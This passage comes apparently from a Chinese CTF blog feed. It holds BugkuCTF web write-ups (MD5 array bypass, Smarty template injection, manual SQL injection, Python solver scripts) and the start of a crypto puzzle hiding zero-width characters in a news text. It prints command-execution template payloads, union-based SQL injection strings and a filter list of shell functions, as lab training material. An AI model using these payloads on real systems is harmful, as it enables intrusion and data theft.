MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])==null,md5(b[])==null，md5(a[])=md5(b[])=null,这样也可以得到答案了。</p><pre class="line-numbers language-none"><code class="language-none">构造: index.php?v1[]&#x3D;1&amp;v2[]&#x3D;2&amp;v3[]&#x3D;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到<strong>flag{64608b793996e7d5ea23984c5dd17e77}</strong></p><h3 id="9-聪明的php"><a href="#9-聪明的php" class="headerlink" title="9 聪明的php"></a>9 聪明的php</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./libs/Smarty.class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"pass a parameter and maybe the flag file's filename is random :>"</span><span class="token punctuation">;</span><span class="token variable">$smarty</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Smarty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">AS</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span><span class="token keyword">print</span> <span class="token variable">$key</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|\/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>     <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/system|readfile|gz|exec|eval|cat|assert|file|fgets/i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./template.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>     <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$smarty</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"eval:"</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>system|readfile|gz|exec|eval|cat|assert|file|fgets这些函数被过滤掉了,**passthru()**函数没有被过滤可以使用。</p><p>构造**?a={passthru(“ls -al /“)}**</p><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\7.png" alt="1634980934909"></p><blockquote><p> 构造payload： /index.php?f={fread(fopen(“/_23682”,”r”),4096)}</p></blockquote><h3 id="10-学生成绩查询"><a href="#10-学生成绩查询" class="headerlink" title="10  学生成绩查询"></a>10  学生成绩查询</h3><p>典型的<code>sql注入</code>,我还是喜欢手动注入，使用<code>sqlmap</code>更简单，但是多动动手肯定没大事。</p><pre class="line-numbers language-none"><code class="language-none">id&#x3D;a&#39; union select 1,2,3,4#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">id&#x3D;a&#39; union select 1,2,3,database()#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\8.png" alt="8"></p><p>得到数据库为skctf，在使用查询语句，查询表名</p><p><code>id=a; union select 1,2,3,concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;</code></p><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\9.png" alt="9"></p><p><code>id=a&#39; union select 1,2,3,concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;</code>确定列名为<strong>skctf_flag</strong></p><p>继续注入<code>id=a&#39; union select 1,2,3,concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39; #</code>得到<strong>flag{ceea3e18163b989ab469f6b2ad7bec22}</strong></p><h3 id="11-秋名山车神"><a href="#11-秋名山车神" class="headerlink" title="11 秋名山车神"></a>11 秋名山车神</h3><p>亲请在2s内计算老司机的车速是多少</p><p>1213033684-39909826-1331751592-916805948 *  50919270+831329677-2067628447 *  306216988*695768212-91423220+1902912207=?;</p><p>刷新了一下确定这个是会不断改变的，还是写一个脚本解决吧，这个题目可不是人手能算的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestss<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token operator">=</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://114.67.246.176:18683/"</span><span class="token punctuation">)</span>searchObj<span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'^&lt;div>(.*)=\?;&lt;/div>$'</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span>re<span class="token punctuation">.</span>M <span class="token operator">|</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>d<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"value"</span><span class="token punctuation">:</span><span class="token builtin">eval</span><span class="token punctuation">(</span>searchObj<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token operator">=</span>s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://114.67.246.176:18683/"</span><span class="token punctuation">,</span>data<span class="token operator">=</span>d<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="12-速度要快"><a href="#12-速度要快" class="headerlink" title="12 速度要快"></a>12 速度要快</h3><p>使用<strong>Firefox</strong>打开题目网址，在F12下有个<strong>flag：</strong>这个是通过base64加密的产物，通过base64解码。得到</p><blockquote><p>6LeR55qE6L+Y5LiN6ZSZ77yM57uZ5L2gZmxhZ+WQpzogTkRZNE9EST0=</p></blockquote><p><strong><del>NDY4ODI=</del><strong>解码得到</strong>46882</strong>,传一下，然后他骂我……</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">import requestsimport base64url <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token string single-quoted-string">'http://123.206.87.240:8002/web6/'</span><span class="token string single-quoted-string">''</span>header <span class="token operator">=</span> requests<span class="token operator">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token operator">.</span>headerskey <span class="token operator">=</span> base64<span class="token operator">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>base64<span class="token operator">.</span><span class="token function">b64decode</span><span class="token punctuation">(</span>header<span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>phpsessid <span class="token operator">=</span> header<span class="token punctuation">[</span><span class="token string single-quoted-string">'Set-Cookie'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>post <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'margin'</span><span class="token punctuation">:</span>key<span class="token punctuation">&#125;</span>cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'PHPSESSID'</span><span class="token punctuation">:</span>phpsessid<span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token operator">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> post<span class="token punctuation">,</span> cookies <span class="token operator">=</span> cookie<span class="token punctuation">)</span><span class="token operator">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用python脚本解码，并传参得到flag。</p><h3 id="13-社工-伪造"><a href="#13-社工-伪造" class="headerlink" title="13 社工 伪造"></a>13 社工 伪造</h3><p>这道题我不想多说,改QQ名这件事当真离谱……</p><p><img src="D:\blog\shierjinghuang\source_posts\BugkuCTF之web解题记录-一\10.png" alt="1634986224287"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku靶场之crypto 二</title>
      <link href="/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/"/>
      <url>/2021/10/16/bugku%E9%9D%B6%E5%9C%BA%E4%B9%8Bcrypto-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="bugku靶场之crypto-二"><a href="#bugku靶场之crypto-二" class="headerlink" title="bugku靶场之crypto(二)"></a>bugku靶场之crypto(二)</h2><h3 id="1-一段新闻"><a href="#1-一段新闻" class="headerlink" title="1 一段新闻"></a>1 一段新闻</h3><blockquote><p>近日，教育部、财政部印发《关于实施中小学幼儿园教师国家级培训计划（2021—2025年）的通知》（以下简称《通知》），明确“十四五”期间“国培计划”实施思路、支持方向、工作重点，推进教师培训提质增效，助力教师队伍高质量发展。‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‍‍‍‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‌‌‌‍‌‍‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‍‌‍‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‌‌‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‍‍‌‌‍‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‍‌‍‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‍‌‌‌‌‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‍‍‍‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‍‌‌‌‌‌‌‍‌‍‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‍‍‌‌‍‍‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‌‍‍‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‌‌‍‍‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‍‌‌‌‍‍‍‍‌‌‍‌‍‍‌‍‌‌‍‍‍‌‌‌‌‌‌‌‌‌‌‌‍‍‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‌‌‍‌‌‌‍‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‌‌‌‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‍‌‌‌‍‌‌‌‌‌‌‌‍‍‍‍‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‌‌‌‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‍‌‍‌‌‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‍‍‍‌‍‌‍‌‌‌‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‌‍‍‍‌‌‌‌‌‌‍‌‍‍‌‍‌‌‍‍‌‌‌‌‌‌‌‌‌‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‌‌‌‌‍‌‌‍‍‍‍‌‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‌‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‍‍‌‌‍‌‍‌‌‍‍‍‍‍‍‍‍‍‌‍‍‌‍‌‌‍‌‌‌‌‌‌‍‍‍‍‍‌‌‌‌‍‌‍‌‌‍‍‌‍‌‌‍‍‌‌‌‌‍‌‌‌‍‌‌‌‌‌‌‌‍‍‌‍‍‌‍‌‌‍‍‌‌‌‌